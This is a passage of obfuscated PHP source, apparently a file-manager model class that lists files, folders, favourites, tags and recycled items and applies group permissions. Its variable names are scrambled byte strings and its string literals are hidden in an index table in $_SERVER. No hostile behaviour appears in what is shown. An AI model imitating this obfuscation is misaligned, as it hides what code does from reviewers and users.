$this->where($ÔœâÕÍå)->delete(); } public function cacheSet($ØÔî©Ä‚, $Áõù×…ó = false) { return Cache::set($this->cacheKey($ØÔî©Ä‚), $Áõù×…ó); } public function cacheGet($—ÙÌ€Á) { return Cache::get($this->cacheKey($—ÙÌ€Á)); } public function cacheRemove($Ğ„„öŸ) { return Cache::remove($this->cacheKey($Ğ„„öŸ)); } protected function filterWhere($¿Áè±È) { return $¿Áè±È; } protected function cacheKey($ŠØæ©¨Ö) { return $ŠØæ©¨Ö; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\x73\x6f\x75\162\143\145"; protected $tableMeta = array("\164\141\142\x6c\x65\116\141\155\x65" => "\x69\157\137\163\157\165\162\x63\x65\x5f\x6d\145\164\141", "\155\x65\164\141\106\x69\145\x6c\144" => "\163\157\165\x72\x63\145\111\104"); protected $dataAuto = array(array("\x6d\157\x64\x69\x66\x79\x54\x69\155\145", "\164\x69\155\x65", "\x69\156\163\145\162\164", "\x66\x75\156\x63\x74\151\157\156"), array("\143\162\145\141\x74\x65\x54\x69\155\145", "\x74\151\x6d\x65", "\x69\156\x73\x65\162\x74", "\146\165\x6e\x63\x74\x69\157\x6e"), array("\x76\x69\x65\x77\124\151\155\x65", "\164\151\155\x65", "\151\x6e\163\145\162\x74", "\x66\165\156\143\x74\151\157\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($óùëø…) { return $this->listSource(array($_SERVER[º·Ï‹¥³][461] => $óùëø…)); } public function typeName($í¥ñë¨ñ) { static $”Õ‰ö = array(self::TYPE_SYSTEM => "\163\171\x73\164\x65\x6d", self::TYPE_USER => "\165\163\x65\162", self::TYPE_GROUP => "\147\162\x6f\165\160"); return $”Õ‰ö[$í¥ñë¨ñ . $_SERVER[º·Ï‹¥³][12]]; } public function sourceListInfo($‘‰¶îÆ¤, $Îú¯¯áÌ = false) { $ç°Ê¡ŸÁ =& $_SERVER[º·Ï‹¥³]; $‘‰¶îÆ¤ = $‘‰¶îÆ¤ ? $‘‰¶îÆ¤ : array(); $‘‰¶îÆ¤ = array_filter(array_unique($‘‰¶îÆ¤)); if (!$‘‰¶îÆ¤) { return array(); } $”ñ¶âõ’ = $this->where(array($ç°Ê¡ŸÁ[184] => array($ç°Ê¡ŸÁ[7], $‘‰¶îÆ¤)))->select(); $this->_listDataApply($”ñ¶âõ’, $Îú¯¯áÌ); return array_to_keyvalue($”ñ¶âõ’, $ç°Ê¡ŸÁ[184]); } public function pathInfoFilter(&$šì×¿ºó) { $“ğ™¾ =& $_SERVER[º·Ï‹¥³]; static $­ÖßÏç = false; static $ûóÇ…¡ = false; static $ùüüµÜÓ = false; if (!$­ÖßÏç) { $üùãş‹Û = $“ğ™¾[462]; $üùãş‹Û .= $“ğ™¾[463]; $üùãş‹Û .= $“ğ™¾[464]; $×ÄóÎ¼å = $“ğ™¾[465]; $µ¾”ìšš = explode($“ğ™¾[50], $×ÄóÎ¼å); $­ÖßÏç = explode($“ğ™¾[50], $üùãş‹Û); $ûóÇ…¡ = array(); foreach ($­ÖßÏç as $í¢¹¸ìÏ) { if (in_array($í¢¹¸ìÏ, $µ¾”ìšš)) { continue; } $ûóÇ…¡[] = $í¢¹¸ìÏ; } $ùüüµÜÓ = explode($“ğ™¾[50], $“ğ™¾[466]); } foreach ($ùüüµÜÓ as $İóÂ’¡†) { if (isset($šì×¿ºó[$İóÂ’¡†])) { $šì×¿ºó[$İóÂ’¡†] = intval($šì×¿ºó[$İóÂ’¡†]); } } $šì×¿ºó[$“ğ™¾[87]] = $“ğ™¾[467] . $šì×¿ºó[$“ğ™¾[184]] . $“ğ™¾[468]; $šì×¿ºó[$“ğ™¾[33]] = $šì×¿ºó[$“ğ™¾[469]] == 1 ? $“ğ™¾[78] : $“ğ™¾[221]; $šì×¿ºó[$“ğ™¾[181]] = $this->typeName($šì×¿ºó[$“ğ™¾[181]]); if ($šì×¿ºó[$“ğ™¾[469]] != 1) { $šì×¿ºó[$“ğ™¾[178]] = $šì×¿ºó[$“ğ™¾[470]]; unset($šì×¿ºó[$“ğ™¾[470]]); } $üÎ¡ã›Ô = $­ÖßÏç; if (isset($šì×¿ºó[$“ğ™¾[471]]) && $šì×¿ºó[$“ğ™¾[471]][$“ğ™¾[472]] == -1) { $üÎ¡ã›Ô = $ûóÇ…¡; } $šì×¿ºó = array_field_key($šì×¿ºó, $üÎ¡ã›Ô); return $šì×¿ºó; } public function listUserFav() { $µ–ÂÒ‰ =& $_SERVER[º·Ï‹¥³]; $ğ×ŠÖ¥Í = Model($µ–ÂÒ‰[473])->listData(); $ÑÑÔ‡²ï = array_filter_by_field($ğ×ŠÖ¥Í, $µ–ÂÒ‰[33], $µ–ÂÒ‰[474]); $ÑÑÔ‡²ï = array_to_keyvalue($ÑÑÔ‡²ï, $µ–ÂÒ‰[12], $µ–ÂÒ‰[87]); if ($ÑÑÔ‡²ï) { $Í÷£œÕË = $this->listSource(array($µ–ÂÒ‰[475] => array($µ–ÂÒ‰[476], $ÑÑÔ‡²ï))); } $Í÷£œÕË = array_to_keyvalue($Í÷£œÕË[$µ–ÂÒ‰[429]], $µ–ÂÒ‰[184]); foreach ($ğ×ŠÖ¥Í as &$Ğ•ñø¥È) { $Ğ•ñø¥È = array($µ–ÂÒ‰[477] => $Ğ•ñø¥È[$µ–ÂÒ‰[459]], $µ–ÂÒ‰[478] => $Ğ•ñø¥È[$µ–ÂÒ‰[32]], $µ–ÂÒ‰[479] => $Ğ•ñø¥È[$µ–ÂÒ‰[87]], $µ–ÂÒ‰[480] => $Ğ•ñø¥È[$µ–ÂÒ‰[33]], $µ–ÂÒ‰[481] => $Ğ•ñø¥È[$µ–ÂÒ‰[222]], $µ–ÂÒ‰[482] => $Ğ•ñø¥È[$µ–ÂÒ‰[88]]); if ($Ğ•ñø¥È[$µ–ÂÒ‰[33]] == $µ–ÂÒ‰[474] && $Í÷£œÕË[$Ğ•ñø¥È[$µ–ÂÒ‰[87]]]) { $Ğ•ñø¥È[$µ–ÂÒ‰[90]] = $Í÷£œÕË[$Ğ•ñø¥È[$µ–ÂÒ‰[87]]]; } } unset($Ğ•ñø¥È); return $ğ×ŠÖ¥Í; } public function listUserTag($É‡İÖãù) { $›†ÀÂŠ¾ =& $_SERVER[º·Ï‹¥³]; if ($É‡İÖãù && !is_array($É‡İÖãù)) { $É‡İÖãù = array($É‡İÖãù); } $õšŠ¡– = Model($›†ÀÂŠ¾[483])->listData(); $Ñ«¸ ‰Š = array(); $¤í§Ã½ = array(); foreach ($õšŠ¡– as $»˜ê³Ää) { $’ìÊ›Á = $»˜ê³Ää[$›†ÀÂŠ¾[87]]; if (!$’ìÊ›Á) { continue; } if (!isset($¤í§Ã½[$’ìÊ›Á])) { $¤í§Ã½[$’ìÊ›Á] = array(); } $¤í§Ã½[$’ìÊ›Á][] = $»˜ê³Ää[$›†ÀÂŠ¾[484]]; $Ñ«¸ ‰Š[$»˜ê³Ää[$›†ÀÂŠ¾[87]]] = $»˜ê³Ää; } $È¤êÀ‡¡ = array(); $ú¸ñşúÙ = array(); $§“±¹õƒ = array(); foreach ($¤í§Ã½ as $”øÕóı => $¢’±‚‰¾) { $ÃÒµĞ = !0; if (!$É‡İÖãù) { $È¤êÀ‡¡[] = $”øÕóı; continue; } foreach ($É‡İÖãù as $şÔöÀóˆ) { if (!in_array($şÔöÀóˆ, $¢’±‚‰¾)) { $ÃÒµĞ = !1; break; } } if (!$ÃÒµĞ) { continue; } if (!is_numeric($”øÕóı)) { $Şµ©Ú¼£ = $Ñ«¸ ‰Š[$”øÕóı]; $‘†úÁÏé = array($›†ÀÂŠ¾[32] => $Şµ©Ú¼£[$›†ÀÂŠ¾[32]], $›†ÀÂŠ¾[87] => $Şµ©Ú¼£[$›†ÀÂŠ¾[87]], $›†ÀÂŠ¾[33] => $Şµ©Ú¼£[$›†ÀÂŠ¾[33]], $›†ÀÂŠ¾[90] => array($›†ÀÂŠ¾[485] => 1), $›†ÀÂŠ¾[223] => !0); if ($Şµ©Ú¼£[$›†ÀÂŠ¾[33]] == $›†ÀÂŠ¾[221]) { $§“±¹õƒ[] = $‘†úÁÏé; } if ($Şµ©Ú¼£[$›†ÀÂŠ¾[33]] == $›†ÀÂŠ¾[78]) { $ú¸ñşúÙ[] = $‘†úÁÏé; } continue; } $È¤êÀ‡¡[] = $”øÕóı; } if ($È¤êÀ‡¡) { $»§õ¬ÄŒ = $this->listSource(array($›†ÀÂŠ¾[475] => array($›†ÀÂŠ¾[476], $È¤êÀ‡¡))); } $»§õ¬ÄŒ = $»§õ¬ÄŒ ? $»§õ¬ÄŒ : array($›†ÀÂŠ¾[85] => array(), $›†ÀÂŠ¾[86] => array()); $»§õ¬ÄŒ[$›†ÀÂŠ¾[85]] = array_merge($»§õ¬ÄŒ[$›†ÀÂŠ¾[85]], $ú¸ñşúÙ); $»§õ¬ÄŒ[$›†ÀÂŠ¾[86]] = array_merge($»§õ¬ÄŒ[$›†ÀÂŠ¾[86]], $§“±¹õƒ); if (isset($»§õ¬ÄŒ[$›†ÀÂŠ¾[426]]) && count($È¤êÀ‡¡) == $»§õ¬ÄŒ[$›†ÀÂŠ¾[426]][$›†ÀÂŠ¾[427]]) { return $»§õ¬ÄŒ; } $ÈìÒ¥¬ = array(); $ğ¢òÚÚ˜ = array_to_keyvalue($»§õ¬ÄŒ[$›†ÀÂŠ¾[85]], $›†ÀÂŠ¾[12], $›†ÀÂŠ¾[184]); $â”Şì¦© = array_to_keyvalue($»§õ¬ÄŒ[$›†ÀÂŠ¾[86]], $›†ÀÂŠ¾[12], $›†ÀÂŠ¾[184]); $í÷šÏ‚à = array_merge($â”Şì¦©, $ğ¢òÚÚ˜); foreach ($È¤êÀ‡¡ as $’ìÊ›Á) { if (!in_array($’ìÊ›Á, $í÷šÏ‚à)) { $ÈìÒ¥¬[] = $’ìÊ›Á; } } if ($ÈìÒ¥¬) { Model($›†ÀÂŠ¾[486])->removeBySource($ÈìÒ¥¬); } return $»§õ¬ÄŒ; } public function listUserRecycle() { $ØÊ¥ßƒå =& $_SERVER[º·Ï‹¥³]; $ˆÈÙƒö¥ = Model($ØÊ¥ßƒå[487])->listData(); if (!$ˆÈÙƒö¥) { return array(); } $¿ç™…¦¡ = array($ØÊ¥ßƒå[475] => array($ØÊ¥ßƒå[476], $ˆÈÙƒö¥), $ØÊ¥ßƒå[488] => 1); return $this->listSource($¿ç™…¦¡); } public function listSource($îšıÎíş, $ú ö‰ = 3000, $ÓéÕÂ¹ã = false) { $ØÚäªÛ• =& $_SERVER[º·Ï‹¥³]; if (!isset($îšıÎíş[$ØÚäªÛ•[489]])) { $îšıÎíş[$ØÚäªÛ•[489]] = 0; } if (isset($îšıÎíş[$ØÚäªÛ•[183]]) && $îšıÎíş[$ØÚäªÛ•[183]] == $ØÚäªÛ•[219]) { $îšıÎíş[$ØÚäªÛ•[470]] = array($ØÚäªÛ•[382], $ØÚäªÛ•[490]); } $ëš¶¯Éò = $ØÚäªÛ•[491]; $„ÜÖó¿º = $this->field($ëš¶¯Éò)->_makeOrder()->where($îšıÎíş)->selectPage($ú ö‰); $this->_listPageCheck($„ÜÖó¿º, $ëš¶¯Éò, $îšıÎíş); $this->_listDataApply($„ÜÖó¿º[$ØÚäªÛ•[429]], $ÓéÕÂ¹ã); $this->_listMake($„ÜÖó¿º); return $„ÜÖó¿º; } private function _listPageCheck(&$ß™è¿š, $ÂÅçÁª„, $æ§ÑÔêÑ) { $ÊåÏ¼ş =& $_SERVER[º·Ï‹¥³]; if (!is_array($ß™è¿š[$ÊåÏ¼ş[426]])) { return; } $Ü•°Ü = $ß™è¿š[$ÊåÏ¼ş[426]]; if ($Ü•°Ü[$ÊåÏ¼ş[428]] <= 1) { return; } if ($Ü•°Ü[$ÊåÏ¼ş[427]] >= 100000) { return; } if (Model($ÊåÏ¼ş[492])->get($ÊåÏ¼ş[493]) != $ÊåÏ¼ş[494]) { return; } $ÂÅçÁª„ = str_replace(array($ÊåÏ¼ş[53], $ÊåÏ¼ş[393], $ÊåÏ¼ş[253]), $ÊåÏ¼ş[12], $ÂÅçÁª„); $ÂÅçÁª„ = $ÊåÏ¼ş[495] . str_replace($ÊåÏ¼ş[50], $ÊåÏ¼ş[496], $ÂÅçÁª„) . $ÊåÏ¼ş[497]; $‹ÊÑö‘ß = $ÊåÏ¼ş[498]; $‹ÊÑö‘ß = $‹ÊÑö‘ß . $ÊåÏ¼ş[499]; $ú€¼æ– = $Ü•°Ü[$ÊåÏ¼ş[423]] * ($Ü•°Ü[$ÊåÏ¼ş[404]] - 1) . $ÊåÏ¼ş[50] . $Ü•°Ü[$ÊåÏ¼ş[423]]; $ò¡‰Ì˜Ş = $this->_makeOrder(!0); $¶Ïî”øì = $ÊåÏ¼ş[495] . str_replace($ÊåÏ¼ş[50], $ÊåÏ¼ş[496], $ò¡‰Ì˜Ş[0]); if (strpos($¶Ïî”øì, $ÊåÏ¼ş[500])) { $¶Ïî”øì = str_replace($ÊåÏ¼ş[500], $ÊåÏ¼ş[501], $¶Ïî”øì); } else { $¶Ïî”øì .= $ÊåÏ¼ş[502] . $ò¡‰Ì˜Ş[1]; } $ëÙÑŞ‰ = array(); foreach ($æ§ÑÔêÑ as $¨àÃÑ‚ => $ŸìíòŞ) { $ëÙÑŞ‰[$ÊåÏ¼ş[495] . $¨àÃÑ‚] = $ŸìíòŞ; } $this->alias($ÊåÏ¼ş[503])->field($ÂÅçÁª„)->limit($ú€¼æ–)->order($¶Ïî”øì); $Èş™´üÁ = $this->join($‹ÊÑö‘ß)->where($ëÙÑŞ‰)->select(); if ($Èş™´üÁ) { $ß™è¿š[$ÊåÏ¼ş[429]] = $Èş™´üÁ; } } protected function _makeOrder($ÅÈ¾¸†Ï = false) { $ƒâóÁ­û =& $_SERVER[º·Ï‹¥³]; $¤ŠæõÌµ = Model($ƒâóÁ­û[504])->get($ƒâóÁ­û[505]); $ÀÎóğƒ = Model($ƒâóÁ­û[504])->get($ƒâóÁ­û[506]); $²ÆÅ«Äë = array($ƒâóÁ­û[507] => $ƒâóÁ­û[508], $ƒâóÁ­û[509] => $ƒâóÁ­û[510]); $¥ŞŠùÇ = array($ƒâóÁ­û[32] => $ƒâóÁ­û[32], $ƒâóÁ­û[79] => $ƒâóÁ­û[79], $ƒâóÁ­û[178] => $ƒâóÁ­û[470], $ƒâóÁ­û[511] => $ƒâóÁ­û[511], $ƒâóÁ­û[512] => $ƒâóÁ­û[513], $ƒâóÁ­û[222] => $ƒâóÁ­û[222], $ƒâóÁ­û[88] => $ƒâóÁ­û[88]); $š‚µÇß™ = Input::get($ƒâóÁ­û[514], $ƒâóÁ­û[7], $¤ŠæõÌµ, array_keys($¥ŞŠùÇ)); $¿è–à = Input::get($ƒâóÁ­û[515], $ƒâóÁ­û[7], $ÀÎóğƒ, array_keys($²ÆÅ«Äë)); if (!in_array($š‚µÇß™, array_keys($¥ŞŠùÇ))) { $š‚µÇß™ = $ƒâóÁ­û[32]; } if (!in_array($¿è–à, array_keys($²ÆÅ«Äë))) { $š‚µÇß™ = $ƒâóÁ­û[507]; } if ($š‚µÇß™ == $ƒâóÁ­û[32]) { } $Ô± Á‘ = $ƒâóÁ­û[516] . $¥ŞŠùÇ[$š‚µÇß™] . $ƒâóÁ­û[53] . $²ÆÅ«Äë[$¿è–à]; $Ô± Á‘ = rtrim(trim($Ô± Á‘), $ƒâóÁ­û[50]); if ($ÅÈ¾¸†Ï) { return array($Ô± Á‘, $²ÆÅ«Äë[$¿è–à]); } return $this->order($Ô± Á‘); } protected function _listDataApplyItem($¯Ïá³ñ», $­™İ”Æ¥ = false) { $½Â¼Á¸ = array($¯Ïá³ñ»); $this->_listDataApply($½Â¼Á¸, $­™İ”Æ¥); return $½Â¼Á¸[0]; } protected function _listDataApply(&$äğäÈ , $Â¾éêÒÏ = false) { $Šİ†Ş„ =& $_SERVER[º·Ï‹¥³]; if (!$äğäÈ ) { $äğäÈ  = array(); return; } $ÕÍ‚¶œç = array_to_keyvalue($äğäÈ , $Šİ†Ş„[12], $Šİ†Ş„[184]); $ÕÍ‚¶œç = array_unique($ÕÍ‚¶œç); $this->_listSourceCache($äğäÈ ); if (!$Â¾éêÒÏ) { $this->_listAppendMeta($äğäÈ , $ÕÍ‚¶œç); $this->_listAppendFileMeta($äğäÈ , $ÕÍ‚¶œç); $this->_listAppendChildren($äğäÈ , $ÕÍ‚¶œç); } $this->_listAppendPath($äğäÈ ); $this->_listAppendAuth($äğäÈ ); $this->_listAppendSourceInfo($äğäÈ , $ÕÍ‚¶œç); $this->_listAppendUser($äğäÈ ); $this->_listFilterInfo($äğäÈ , $Â¾éêÒÏ); $this->_listAppendAuthSecret($äğäÈ ); } protected function _listSourceCache($ˆ©Ç¡‹) { $ğ•ç¸à¹ =& $_SERVER[º·Ï‹¥³]; foreach ($ˆ©Ç¡‹ as $ºĞ“Øíœ) { self::$cacheSourceInfo[$ğ•ç¸à¹[517] . $ºĞ“Øíœ[$ğ•ç¸à¹[184]]] = $ºĞ“Øíœ; } } protected function _listFilterInfo(&$Ÿæµú©ı, $Ğñóç‚Š = false) { $ƒ…ÍŸäï =& $_SERVER[º·Ï‹¥³]; foreach ($Ÿæµú©ı as &$õşÈŠå£) { $õşÈŠå£ = $this->pathInfoFilter($õşÈŠå£); self::$cachePathInfo[$ƒ…ÍŸäï[518] . intval($Ğñóç‚Š) . $ƒ…ÍŸäï[446] . $õşÈŠå£[$ƒ…ÍŸäï[184]]] = $õşÈŠå£; } unset($õşÈŠå£); } protected function _listMake(&$‚™õÉÓ…) { $È‚²“ªı =& $_SERVER[º·Ï‹¥³]; $‚™õÉÓ…[$È‚²“ªı[85]] = array(); $‚™õÉÓ…[$È‚²“ªı[86]] = array(); foreach ($‚™õÉÓ…[$È‚²“ªı[429]] as $§äşÄÜ) { $¾•Œœ™Í = $§äşÄÜ[$È‚²“ªı[469]] == 1 ? $È‚²“ªı[85] : $È‚²“ªı[86]; $‚™õÉÓ…[$¾•Œœ™Í][] = $§äşÄÜ; } unset($‚™õÉÓ…[$È‚²“ªı[429]]); } protected function _listAppendMeta(&$åÚÌŠß, $¯Çùµ‹) { $ë­ÈËÍ =& $_SERVER[º·Ï‹¥³]; $ƒ‘Ü™‘ = array($ë­ÈËÍ[475] => array($ë­ÈËÍ[476], $¯Çùµ‹)); $æ‡€ŸØ… = Model($ë­ÈËÍ[519])->field($ë­ÈËÍ[520])->where($ƒ‘Ü™‘)->select(); if (!$æ‡€ŸØ…) { return; } $Ø‘ö¦¨â = array($ë­ÈËÍ[521], $ë­ÈËÍ[522], $ë­ÈËÍ[501]); $ìµÙÀÅ« = array(); foreach ($æ‡€ŸØ… as $›ºŠÂ Ø) { if (!isset($ìµÙÀÅ«[$›ºŠÂ Ø[$ë­ÈËÍ[184]]])) { $ìµÙÀÅ«[$›ºŠÂ Ø[$ë­ÈËÍ[184]]] = array(); } if (in_array($›ºŠÂ Ø[$ë­ÈËÍ[97]], $Ø‘ö¦¨â)) { continue; } $ìµÙÀÅ«[$›ºŠÂ Ø[$ë­ÈËÍ[184]]][$›ºŠÂ Ø[$ë­ÈËÍ[97]]] = $›ºŠÂ Ø[$ë­ÈËÍ[434]]; } foreach ($åÚÌŠß as &$ÂØ×‹Í©) { $ÂØ×‹Í©[$ë­ÈËÍ[523]] = !1; if (isset($ìµÙÀÅ«[$ÂØ×‹Í©[$ë­ÈËÍ[184]]])) { $ÂØ×‹Í©[$ë­ÈËÍ[523]] = $ìµÙÀÅ«[$ÂØ×‹Í©[$ë­ÈËÍ[184]]]; } if ($this->fileIsLock($ÂØ×‹Í©) && $ÂØ×‹Í©[$ë­ÈËÍ[471]]) { $Ğ¿ãüš = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ÂØ×‹Í©[$ë­ÈËÍ[471]][$ë­ÈËÍ[472]] = AuthModel::authDisable($ÂØ×‹Í©[$ë­ÈËÍ[471]][$ë­ÈËÍ[472]], $Ğ¿ãüš); $ÂØ×‹Í©[$ë­ÈËÍ[471]][$ë­ÈËÍ[524]][$ë­ÈËÍ[471]] = $ÂØ×‹Í©[$ë­ÈËÍ[471]][$ë­ÈËÍ[472]]; } } unset($ÂØ×‹Í©); } protected function _listAppendFileMeta(&$™£†ü·Æ, $¦Îî¡Š†) { $ëˆêíÊÕ =& $_SERVER[º·Ï‹¥³]; $éé“ÜÁš = array_to_keyvalue($™£†ü·Æ, $ëˆêíÊÕ[12], $ëˆêíÊÕ[525]); $éé“ÜÁš = array_filter(array_unique($éé“ÜÁš)); if (!$éé“ÜÁš) { return; } $¹Î‚¶Ğ = array($ëˆêíÊÕ[526] => array($ëˆêíÊÕ[476], $éé“ÜÁš)); $…‚³ğˆÁ = $ëˆêíÊÕ[527]; $ö¿‡Ì‹° = Model($ëˆêíÊÕ[528])->field($…‚³ğˆÁ)->where($¹Î‚¶Ğ)->select(); $ö¿‡Ì‹° = array_to_keyvalue($ö¿‡Ì‹°, $ëˆêíÊÕ[525]); $ŠÀÃ´¸ = Model($ëˆêíÊÕ[529])->field($ëˆêíÊÕ[530])->where($¹Î‚¶Ğ)->select(); $ŠÀÃ´¸ = $ŠÀÃ´¸ ? $ŠÀÃ´¸ : array(); $ä¬Œ…µ“ = array(); foreach ($ŠÀÃ´¸ as $š·‡ºâş) { if (!isset($ä¬Œ…µ“[$š·‡ºâş[$ëˆêíÊÕ[525]]])) { $ä¬Œ…µ“[$š·‡ºâş[$ëˆêíÊÕ[525]]] = array(); } $ä¬Œ…µ“[$š·‡ºâş[$ëˆêíÊÕ[525]]][$š·‡ºâş[$ëˆêíÊÕ[97]]] = $š·‡ºâş[$ëˆêíÊÕ[434]]; } foreach ($™£†ü·Æ as &$—„ÚÆÓÅ) { $··¬€¡š = $—„ÚÆÓÅ[$ëˆêíÊÕ[525]]; if (!$··¬€¡š || !is_array($ö¿‡Ì‹°[$··¬€¡š])) { continue; } $Í¢··ƒ¼ = $ö¿‡Ì‹°[$··¬€¡š]; $Í¢··ƒ¼[$ëˆêíÊÕ[79]] = $—„ÚÆÓÅ[$ëˆêíÊÕ[79]]; $Í¢··ƒ¼[$ëˆêíÊÕ[32]] = $—„ÚÆÓÅ[$ëˆêíÊÕ[32]]; if (!$Í¢··ƒ¼[$ëˆêíÊÕ[531]]) { Model($ëˆêíÊÕ[528])->fileMd5Check($Í¢··ƒ¼); } if (!isset(self::$cacheFileInfo[$ëˆêíÊÕ[532] . $··¬€¡š])) { self::$cacheFileInfo[$ëˆêíÊÕ[532] . $··¬€¡š] = array_merge(array(), $Í¢··ƒ¼); } unset($ö¿‡Ì‹°[$··¬€¡š][$ëˆêíÊÕ[87]]); $á¹Ò¼Ê¬ = is_array($ä¬Œ…µ“[$··¬€¡š]) ? $ä¬Œ…µ“[$··¬€¡š] : array(); $—„ÚÆÓÅ[$ëˆêíÊÕ[533]] = array_merge($á¹Ò¼Ê¬, $ö¿‡Ì‹°[$··¬€¡š]); if (isset($—„ÚÆÓÅ[$ëˆêíÊÕ[533]][$ëˆêíÊÕ[174]])) { $—„ÚÆÓÅ[$ëˆêíÊÕ[174]] = json_decode($—„ÚÆÓÅ[$ëˆêíÊÕ[533]][$ëˆêíÊÕ[174]], !0); unset($—„ÚÆÓÅ[$ëˆêíÊÕ[533]][$ëˆêíÊÕ[174]]); } } unset($—„ÚÆÓÅ); } protected function _listAppendSourceInfo(&$²ğ¢íÑß, $Ç×“”‹¿) { $´ó’¬Û =& $_SERVER[º·Ï‹¥³]; $úÅŠüˆ¿ = Model($´ó’¬Û[534])->listData(); $ƒĞ±©¸à = Model($´ó’¬Û[483])->listData(); $ê°Ûƒç = Model($´ó’¬Û[473])->listData(); $ÒŠë—Ğ = Model($´ó’¬Û[535])->listSimple(); $œ«§ÀïÏ = array_to_keyvalue($úÅŠüˆ¿, $´ó’¬Û[459]); $§Çòó = array_to_keyvalue_group($ƒĞ±©¸à, $´ó’¬Û[87], $´ó’¬Û[484]); $àŸş¢‘ú = array_to_keyvalue($ê°Ûƒç, $´ó’¬Û[87]); $Ü“¹“É× = array_to_keyvalue_group($ÒŠë—Ğ, $´ó’¬Û[184]); foreach ($²ğ¢íÑß as &$”á¯î›Š) { $”á¯î›Š[$´ó’¬Û[90]] = array($´ó’¬Û[536] => 0, $´ó’¬Û[537] => 0, $´ó’¬Û[538] => 0); if (isset($àŸş¢‘ú[$”á¯î›Š[$´ó’¬Û[184]]])) { $”á¯î›Š[$´ó’¬Û[90]][$´ó’¬Û[539]] = 1; $”á¯î›Š[$´ó’¬Û[90]][$´ó’¬Û[540]] = $àŸş¢‘ú[$”á¯î›Š[$´ó’¬Û[184]]][$´ó’¬Û[32]]; } if ($§Çòó && $œ«§ÀïÏ && isset($§Çòó[$”á¯î›Š[$´ó’¬Û[184]]])) { $”á¯î›Š[$´ó’¬Û[90]][$´ó’¬Û[541]] = array(); foreach ($§Çòó[$”á¯î›Š[$´ó’¬Û[184]]] as $ûèÄé²) { $ñºàıª× = $œ«§ÀïÏ[$ûèÄé²]; $”á¯î›Š[$´ó’¬Û[90]][$´ó’¬Û[541]][] = array($´ó’¬Û[542] => $ñºàıª×[$´ó’¬Û[459]], $´ó’¬Û[478] => $ñºàıª×[$´ó’¬Û[32]], $´ó’¬Û[543] => $ñºàıª×[$´ó’¬Û[544]]); } } if ($Ü“¹“É× && isset($Ü“¹“É×[$”á¯î›Š[$´ó’¬Û[184]]])) { $”á¯î›Š[$´ó’¬Û[90]][$´ó’¬Û[545]] = array(); foreach ($Ü“¹“É×[$”á¯î›Š[$´ó’¬Û[184]]] as $®ÇíÑ»…) { $òì—ˆûÆ = $´ó’¬Û[546]; if ($®ÇíÑ»…[$´ó’¬Û[547]] == $´ó’¬Û[91]) { $òì—ˆûÆ .= $´ó’¬Û[548]; } $”á¯î›Š[$´ó’¬Û[90]][$´ó’¬Û[545]] = array_field_key($®ÇíÑ»…, explode($´ó’¬Û[50], $òì—ˆûÆ)); } } } unset($”á¯î›Š); return $²ğ¢íÑß; } protected function _listAppendChildren(&$Äè  ºÜ, $’’î¾ÉÙ) { $„œÔúº« =& $_SERVER[º·Ï‹¥³]; $«’¤Şö¨ = array(); $›ııùß® = array($„œÔúº«[230] => 0, $„œÔúº«[231] => 0); foreach ($Äè  ºÜ as &$òÌŸ™Å¸) { if (!$òÌŸ™Å¸[$„œÔúº«[469]]) { continue; } $«’¤Şö¨[] = $òÌŸ™Å¸[$„œÔúº«[184]]; } unset($òÌŸ™Å¸); if (!$«’¤Şö¨) { return; } $„ª‚š‚˜ = array($„œÔúº«[183] => array($„œÔúº«[7], $«’¤Şö¨), $„œÔúº«[489] => 0); $¬Á¹Î’« = array($„œÔúº«[183], $„œÔúº«[469], $„œÔúº«[549] => $„œÔúº«[550]); $Öœ·ÄÇÁ = $this->field($¬Á¹Î’«)->where($„ª‚š‚˜)->group($„œÔúº«[551])->select(); $ËëÏÁç = array(); foreach ($Öœ·ÄÇÁ as $ô“¸†à) { $é©µ¹ê° = $ô“¸†à[$„œÔúº«[183]]; $Ö×–ãî¤ = $ô“¸†à[$„œÔúº«[469]] == $„œÔúº«[91] ? $„œÔúº«[231] : $„œÔúº«[230]; if (!isset($ËëÏÁç[$é©µ¹ê°])) { $ËëÏÁç[$é©µ¹ê°] = array($„œÔúº«[230] => 0, $„œÔúº«[231] => 0); } $ËëÏÁç[$é©µ¹ê°][$Ö×–ãî¤] += $ô“¸†à[$„œÔúº«[550]]; } foreach ($Äè  ºÜ as &$òÌŸ™Å¸) { if (!$òÌŸ™Å¸[$„œÔúº«[469]]) { continue; } $ÒÁŒÑ ü = is_array($ËëÏÁç[$òÌŸ™Å¸[$„œÔúº«[184]]]) ? $ËëÏÁç[$òÌŸ™Å¸[$„œÔúº«[184]]] : $›ııùß®; $òÌŸ™Å¸[$„œÔúº«[231]] = $ÒÁŒÑ ü[$„œÔúº«[231]]; $òÌŸ™Å¸[$„œÔúº«[230]] = $ÒÁŒÑ ü[$„œÔúº«[230]]; unset($òÌŸ™Å¸[$„œÔúº«[470]]); } unset($òÌŸ™Å¸); } protected function _listAppendAuth(&$¸Şú¬ş§) { $†ùïß×ä =& $_SERVER[º·Ï‹¥³]; $ß¸œª†Ó = array(); foreach ($¸Şú¬ş§ as $õœñ†Ùï) { if ($õœñ†Ùï[$†ùïß×ä[181]] == self::TYPE_GROUP) { $ß¸œª†Ó[] = $õœñ†Ùï[$†ùïß×ä[184]]; } } if (!$ß¸œª†Ó) { return; } $Àèò‚®« = array_to_keyvalue($¸Şú¬ş§, $†ùïß×ä[184]); $¹Œ•“ğø = Model($†ùïß×ä[552])->getSourceList($ß¸œª†Ó, $Àèò‚®«); $Ëš¨ÃÅ– = KodUser::isRoot(); foreach ($¸Şú¬ş§ as $¥¬åó®Ú => &$õœñ†Ùï) { $õœñ†Ùï[$†ùïß×ä[471]] = $¹Œ•“ğø[$õœñ†Ùï[$†ùïß×ä[184]]]; if (!$õœñ†Ùï[$†ùïß×ä[471]] && $õœñ†Ùï[$†ùïß×ä[181]] == self::TYPE_GROUP) { $õœñ†Ùï[$†ùïß×ä[471]] = Action($†ùïß×ä[553])->pathGroupAuthMake($õœñ†Ùï[$†ùïß×ä[554]]); if (!$õœñ†Ùï[$†ùïß×ä[471]] && !$Ëš¨ÃÅ–) { $õœñ†Ùï[$†ùïß×ä[224]] = !1; $õœñ†Ùï[$†ùïß×ä[223]] = !1; } } if ($õœñ†Ùï[$†ùïß×ä[471]]) { $õœñ†Ùï[$†ùïß×ä[224]] 